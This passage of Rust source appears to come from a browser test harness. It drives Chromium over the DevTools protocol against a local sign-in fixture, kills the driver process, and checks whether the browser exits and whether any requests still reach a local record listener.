            let session = s["sessionId"].as_str().ok_or("no session")?.to_string();
            let pattern =
                serde_json::json!({"patterns": [{"urlPattern": "*", "requestStage": "Request"}]});
            b.call("Fetch.enable", pattern.clone(), None, &mut on)?;
            b.call("Fetch.enable", pattern, Some(&session), &mut on)?;
            b.call(
                "Page.navigate",
                serde_json::json!({"url": a.page}),
                Some(&session),
                &mut on,
            )?;
            let deadline = Instant::now() + r3_web::cdp::STEP_TIMEOUT;
            loop {
                let r = b.call(
                    "Runtime.evaluate",
                    serde_json::json!({"expression": "location.href + ' ' + document.readyState", "returnByValue": true}),
                    Some(&session),
                    &mut on,
                )?;
                if r["result"]["value"].as_str() == Some(&format!("{} complete", a.page)) {
                    break;
                }
                if Instant::now() > deadline {
                    return Err("load".into());
                }
                b.pump(Duration::from_millis(100), &mut on);
            }
            b.call(
                "Runtime.evaluate",
                serde_json::json!({"expression": held_script(&a.target), "returnByValue": true}),
                Some(&session),
                &mut on,
            )?;
            Ok(())
        })();
        if let Err(e) = steps {
            eprintln!("driver pipe step {}", printable(&e));
            b.kill();
            return ExitCode::from(1);
        }
        let deadline = Instant::now() + r3_web::cdp::STEP_TIMEOUT;
        while held.get().is_none() && Instant::now() < deadline {
            b.pump(Duration::from_millis(100), &mut on);
        }
        let Some(outcome) = held.get() else {
            eprintln!("driver pipe step no_paused");
            b.kill();
            return ExitCode::from(1);
        };
        out(&format!("paused outcome={outcome}"));
        let deadline = Instant::now() + CHILD_LIFE;
        while Instant::now() < deadline {
            b.pump(Duration::from_millis(500), &mut on);
        }
        b.kill();
        ExitCode::from(3)
    }

    struct Killed {
        bytes: u64,
        connections: u64,
        path_requests: u64,
        gone_ms: Option<u128>,
        version: String,
        left: bool,
    }

    fn remove_made_dir(dir: &Path) -> bool {
        for _ in 0..50 {
            match std::fs::symlink_metadata(dir) {
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => return true,
                Ok(m) if m.is_dir() => {
                    let _ = std::fs::remove_dir_all(dir);
                }
                _ => return false,
            }
            std::thread::sleep(Duration::from_millis(100));
        }
        false
    }

    async fn close_browser(address: Option<&str>, root: &r3_web::procs::Proc) -> bool {
        if let Some(address) = address {
            if let Ok(Ok((mut browser, mut handler))) = tokio::time::timeout(
                Duration::from_secs(10),
                chromiumoxide::Browser::connect(address.to_string()),
            )
            .await
            {
                let pump = tokio::spawn(async move { while handler.next().await.is_some() {} });
                let _ = tokio::time::timeout(Duration::from_secs(5), browser.close()).await;
                pump.abort();
            }
            let deadline = Instant::now() + CLOSE_WAIT;
            while Instant::now() < deadline {
                if !r3_web::procs::running(root) {
                    return true;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
        }
        r3_web::procs::kill(root);
        let deadline = Instant::now() + Duration::from_secs(5);
        while Instant::now() < deadline {
            if !r3_web::procs::running(root) {
                return true;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        false
    }

    async fn kill_once(
        ctx: &Ctx,
        form: &Form,
        i: u32,
        let_through: bool,
    ) -> Result<Killed, NotRun> {
        if ctx.stop.is_set() {
            return Err(NotRun::new("signal", ""));
        }
        ctx.control
            .reset(&[])
            .map_err(|e| NotRun::new("fixture", e))?;
        let program = ctx.repo.join("tools/r3-trials/web/record-listener.mjs");
        let mut listener =
            Listener::start_record(&program, HELD_PATH).map_err(|e| NotRun::new("listener", e))?;
        let target = format!("http://{UTILITY}:{}{HELD_PATH}", listener.port);
        let mut allow = vec![origin(UTILITY, ctx.port)];
        if let_through {
            allow.push(format!("http://{UTILITY}:{}", listener.port));
        }
        let profile = ctx.scratch.join(format!(
            "{}-p-{}-{}-{i}",
            std::process::id(),
            form.step,
            if let_through { "control" } else { "kill" }
        ));
        let exe = std::env::current_exe().map_err(|e| NotRun::new("driver", e.to_string()))?;
        let mut cmd = std::process::Command::new(exe);
        cmd.arg("--driver-child")
            .arg("--browser")
            .arg(&ctx.browser)
            .arg("--profile")
            .arg(&profile)
            .arg("--page")
            .arg(ctx.u("/signin"))
            .arg("--target")
            .arg(&target)
            .arg("--let-through")
            .arg(if let_through { "yes" } else { "no" })
            .arg("--channel")
            .arg(if form.channel == Channel::Pipe {
                "pipe"
            } else {
                "port"
            })
            .arg("--relay")
            .arg(if form.relay { "yes" } else { "no" })
            .arg("--round2")
            .arg(if ctx.round2 { "yes" } else { "no" });
        for a in &allow {
            cmd.arg("--allow").arg(a);
        }
        let mut child = cmd
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::inherit())
            .spawn()
            .map_err(|e| NotRun::new("driver", e.to_string()))?;
        let Some(stdout) = child.stdout.take() else {
            let _ = child.kill();
            let _ = child.wait();
            return Err(NotRun::new("driver", "no stdout"));
        };
        let (tx, rx) = std::sync::mpsc::channel::<String>();
        std::thread::spawn(move || {
            use std::io::BufRead;
            for line in std::io::BufReader::new(stdout).lines() {
                let Ok(line) = line else { break };
                if tx.send(line).is_err() {
                    break;
                }
            }
        });
        let mut pid = None;
        let mut version = "-".to_string();
        let mut address = None;
        let mut paused = false;
        let deadline = Instant::now() + CHILD_WAIT;
        while Instant::now() < deadline && !ctx.stop.is_set() {
            match rx.recv_timeout(Duration::from_millis(100)) {
                Ok(line) => {
                    if let Some(rest) = line.strip_prefix("started ") {
                        for pair in rest.split(' ') {
                            match pair.split_once('=') {
                                Some(("browser_pid", v)) => pid = v.parse::<u32>().ok(),
                                Some(("version", v)) => version = v.to_string(),
                                _ => {}
                            }
                        }
                    } else if let Some(a) = line.strip_prefix("address ") {
                        address = Some(a.to_string());
                    } else if line.starts_with("paused ") {
                        paused = true;
                        break;
                    }
                }
                Err(std::sync::mpsc::RecvTimeoutError::Timeout) => {}
                Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => break,
            }
        }
        let root = pid.and_then(|p| {
            r3_web::procs::table()
                .ok()?
                .into_iter()
                .find(|q| q.pid == p)
        });
        let t_kill = Instant::now();
        let _ = child.kill();
        let _ = child.wait();
        let mut gone_ms = None;
        if paused {
            while t_kill.elapsed() < KILL_WATCH {
                if gone_ms.is_none() {
                    if let Some(r) = &root {
                        if !r3_web::procs::running(r) {
                            gone_ms = Some(t_kill.elapsed().as_millis());
                        }
                    }
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
        }
        let counts = listener.record_counts();
        listener.stop();
        let mut left = false;
        if let Some(r) = &root {
            if r3_web::procs::running(r) {
                left = !close_browser(address.as_deref(), r).await;
            }
        }
        let mut temp = profile.clone().into_os_string();
        temp.push("-tmp");
        let removed = remove_made_dir(&profile) && remove_made_dir(Path::new(&temp));
        if !removed {
            eprintln!("driver step={} i={i} profile_removed=no", form.step);
        }
        if !paused {
            return Err(NotRun::new("driver", "no paused line"));
        }
        let c = counts.map_err(|e| NotRun::new("listener", e))?;
        Ok(Killed {
            bytes: c.bytes,
            connections: c.connections,
            path_requests: c.path_requests,
            gone_ms,
            version,
            left,
        })
    }

    async fn driver_form(ctx: &Ctx, form: &Form, runs: u32) -> bool {
        let name = form.step;
        let head = format!(
            "candidate={CANDIDATE} machine={} browser={}",
            ctx.machine, ctx.kind
        );
        let control = match kill_once(ctx, form, 0, true).await {
            Ok(k) => k,
            Err(e) => {
                out(&format!("notrun {head} step={name} cause={}", e.cause));
                return false;
            }
        };
        let seen = control.bytes > 0 && control.path_requests > 0;
        out(&format!(
            "control {head} step={name} let_through=yes browser_after={} connections={} bytes={} seen={}",
            if control.gone_ms.is_some() { "gone" } else { "alive" },
            control.connections,
            control.bytes,
            if seen { "yes" } else { "no" }
        ));
        if !seen {
            out(&format!("notrun {head} step={name} cause=control"));
            return false;
        }
        let mut ok = 0;
        let mut bytes = 0;
        let mut gone = Vec::new();
        let mut majors = Vec::new();
        for i in 1..=runs {
            let k = match kill_once(ctx, form, i, false).await {
                Ok(k) => k,
                Err(e) => {
                    out(&format!("notrun {head} step={name} cause={}", e.cause));
                    return false;
                }
            };
            let clean = k.bytes == 0;
            if clean {
                ok += 1;
            }
            bytes += k.bytes;
            if let Some(ms) = k.gone_ms {
                gone.push(ms);
            }
            if let Some(m) = major_of(&k.version) {
                majors.push(m);
            }
            out(&format!(
                "run {head} step={name} i={i} result={} ms={} version={} browser_after={} connections={} bytes={} left={}",
                if clean { "ok" } else { "miss" },
                k.gone_ms.unwrap_or(0),
                k.version,
                if k.gone_ms.is_some() { "gone" } else { "alive" },
                k.connections,
                k.bytes,
                if k.left { "yes" } else { "no" }
            ));
        }
        majors.sort_unstable();
        majors.dedup();
        let Some(major) = majors.first() else {
            out(&format!("notrun {head} step={name} cause=version"));
            return false;
        };
        let miss_bytes = if ok < runs {
            format!(" bytes={bytes}")
        } else {
            String::new()
        };
        out(&format!(
            "kill machine={} form={} kills={runs} arrived={}",
            ctx.machine,
            name.trim_start_matches("driver_killed_"),
            runs - ok
        ));
        out(&format!(
            "cell {head} major={major} step={name} ok={ok} of={runs} median_ms={}{miss_bytes}",
            median(&mut gone)
        ));
        true
    }

    async fn driver_cells(ctx: &Ctx, step: Option<&str>, runs: u32) -> bool {
        let mut all = true;
        for form in FORMS.iter().filter(|f| step.is_none_or(|s| s == f.step)) {
            if ctx.stop.is_set() {
                return false;
            }
            all &= driver_form(ctx, form, runs).await;
        }
        all
    }

    pub async fn main(args: Args, kind: &'static str) -> ExitCode {
        let repo = args.repo.clone().unwrap_or_default();
        let port = args.port.unwrap_or_default();
        let machine = args.machine.clone().unwrap_or_default();
        let stop = match watch_signals() {
            Ok(s) => s,
            Err(e) => {
                eprintln!("signals: {e}");
                out(&format!(
                    "notrun candidate={CANDIDATE} machine={machine} browser={kind} cause=runtime"
                ));
                return ExitCode::from(1);
            }
        };
        let seed = match Seed::load(&repo, 1) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("seed: {e}");
                out(&format!(
                    "notrun candidate={CANDIDATE} machine={machine} browser={kind} cause=seed"
                ));
                return ExitCode::from(1);
            }
        };
        let upstream = if args.fault.is_some() { port + 2 } else { port };
        let server = match Server::start(
            &fixture_program(&repo),
            &["--port".into(), upstream.to_string()],
        ) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("fixture: {e}");
                out(&format!(
                    "notrun candidate={CANDIDATE} machine={machine} browser={kind} cause=fixture"
                ));
                return ExitCode::from(1);
            }
        };
        let proxy = match &args.fault {
            None => None,
            Some(fault) => {
                let program = repo.join("tools/r3-trials/web/faults.mjs");
                let a = [
                    "--listen".to_string(),
                    port.to_string(),
                    "--upstream".into(),
                    upstream.to_string(),
                    "--fault".into(),
                    fault.clone(),
                ];
                match Server::start(&program, &a) {
                    Ok(p) => Some(p),
                    Err(e) => {
                        eprintln!("faults: {e}");
                        server.stop();
                        out(&format!("notrun candidate={CANDIDATE} machine={machine} browser={kind} cause=faults"));
                        return ExitCode::from(1);
                    }
                }
            }
        };
        let mut ctx = Ctx {
            browser: PathBuf::from(args.browser.clone().unwrap_or_default()),
            kind,
            machine: machine.clone(),
            port,
            control: Control { port: upstream },
            seed,
            scratch: args.scratch.clone().unwrap_or_default(),
            headless: !args.headed,
            stop,
            added_flags: args.add_flags.clone(),
            routes: args.routes,
            relayed: args.relay,
            round2: args.round2,
            relay: None,
            repo: repo.clone(),
        };
        let relay = if args.relay {
            match Relay::start().await {
                Ok(r) => {
                    ctx.added_flags.extend(relay_flags(r.port));
                    ctx.relay = Some(r.handle());
                    Some(r)
                }
                Err(e) => {
                    eprintln!("relay {}", e.kind());
                    out(&format!(
                        "notrun candidate={CANDIDATE} machine={machine} browser={kind} cause=relay"
                    ));
                    server.stop();
                    return ExitCode::from(1);
                }
            }
        } else {
            None
        };
        if args.round2 {
            ctx.added_flags
                .extend(ROUND2_FLAGS.iter().map(|f| f.to_string()));
        }
        out(&format!(
            "start candidate={CANDIDATE} machine={machine} browser={kind} fixture_pid={} flags={} added_flags={} rows={} round={} headless={}",
            server.pid(),
            FIRST_FLAGS.len(),
            ctx.added_flags.len(),
            if args.way_rows {
                "ways"
            } else if args.relay_rows {
                "relay"
            } else if args.driver {
                "driver"
            } else if args.isolation {
                "isolation"
            } else {
                "nine"
            },
            if args.round2 { 2 } else { 1 },
            if ctx.headless { "yes" } else { "no" }
        ));
        let code = match args.mode {
            Mode::Cells if args.driver => {
                if driver_cells(&ctx, args.step.as_deref(), args.runs.unwrap_or(20)).await {
                    ExitCode::SUCCESS
                } else {
                    ExitCode::from(1)
                }
            }
            Mode::Cells => {
                let steps: Vec<&str> = match &args.step {
                    Some(s) => vec![s.as_str()],
                    None if args.way_rows => WAY_STEPS.to_vec(),
                    None if args.relay_rows => RELAY_STEPS.to_vec(),
                    None if args.isolation => ISOLATION_STEPS.to_vec(),
                    None => STEPS.to_vec(),
                };
                if cells(&ctx, &steps, args.runs.unwrap_or(10)).await {
                    ExitCode::SUCCESS
                } else {
                    ExitCode::from(1)
                }
            }
            Mode::Extras => {
                if extras(&ctx, args.added_bytes.unwrap_or_default()).await {
                    ExitCode::SUCCESS
                } else {
                    ExitCode::from(1)
                }
            }
            Mode::Resolver => match resolver(&ctx).await {
                Ok(()) => ExitCode::SUCCESS,
                Err(f) => {
                    eprintln!("resolver cause={} detail={}", f.0, f.1);
                    let cause = if f.0 == "signal" {
                        "signal"
                    } else {
                        "resolver"
                    };
                    out(&format!("notrun candidate={CANDIDATE} machine={machine} browser={kind} cause={cause}"));
                    ExitCode::from(1)
                }
            },
            Mode::SnapshotPay => {
                match snapshot_pay(&ctx, args.out.as_deref().unwrap_or(Path::new("-"))).await {
                    Ok(()) => ExitCode::SUCCESS,
                    Err(f) => {
                        eprintln!("snapshot cause={} detail={}", f.0, f.1);
                        let cause = if f.0 == "signal" {
                            "signal"
                        } else {
                            "snapshot"
                        };
                        out(&format!("notrun candidate={CANDIDATE} machine={machine} browser={kind} cause={cause}"));
                        ExitCode::from(1)
                    }
                }
            }
        };
        if let Some(p) = proxy {
            p.stop();
        }
        if let Some(r) = relay {
            out(&format!(
                "relay tunnels={} refused={}",
                r.tunnels(),
                r.refused()
            ));
            r.stop();
        }
        server.stop();
        out("stop fixture=stopped");
        code
    }
}

fn out(line: &str) {
    let mut stdout = std::io::stdout().lock();
    let _ = writeln!(stdout, "{line}");
    let _ = stdout.flush();
}
